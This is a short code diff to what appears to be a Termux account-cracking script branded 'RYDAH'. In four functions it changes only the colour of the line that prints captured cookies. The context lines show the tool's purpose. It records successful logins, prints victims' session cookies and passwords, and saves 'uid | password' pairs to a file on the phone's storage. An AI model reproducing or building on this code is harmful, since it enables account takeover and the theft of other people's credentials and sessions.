@@ -528,7 +528,7 @@ def free1(uid,pwx,tl):
                 uid = coki[7:22]
                 os.system("play-audio RYDAH_OK.mp3")
                 print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
-                print('\r\033[1;37mCookies: '+coki+'')
+                print('\r\033[1;32mCookies: '+coki+'')
                 print('\r\033[1;37mUA: '+pro+'')
                 cek_apk(session,coki)
                 open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
@@ -664,7 +664,7 @@ def free2(uid,pwx,tl):
                 uid = coki[7:22]
                 os.system("play-audio RYDAH_OK.mp3")
                 print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
-                print('\r\033[1;37mCookies: '+coki+'')
+                print('\r\033[1;32mCookies: '+coki+'')
                 print('\r\033[1;37mUA: '+pro+'')
                 cek_apk(session,coki)
                 open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
@@ -794,7 +794,7 @@ def free(uid,pwx,tl):
                 uid = coki[7:22]
                 os.system("play-audio RYDAH_OK.mp3")
                 print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
-                print('\r\033[1;37mCookies: '+coki+'')
+                print('\r\033[1;32mCookies: '+coki+'')
                 print('\r\033[1;37mUA: '+pro+'')
                 cek_apk(session,coki)
                 open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
@@ -925,7 +925,7 @@ def m(uid,pwx,tl):
                 uid = coki[7:22]
                 os.system("play-audio RYDAH_OK.mp3")
                 print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
-                print('\r\033[1;37mCookies: '+coki+'')
+                print('\r\033[1;32mCookies: '+coki+'')
                 print('\r\033[1;37mUA: '+pro+'')
                 cek_apk(session,coki)
                 open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
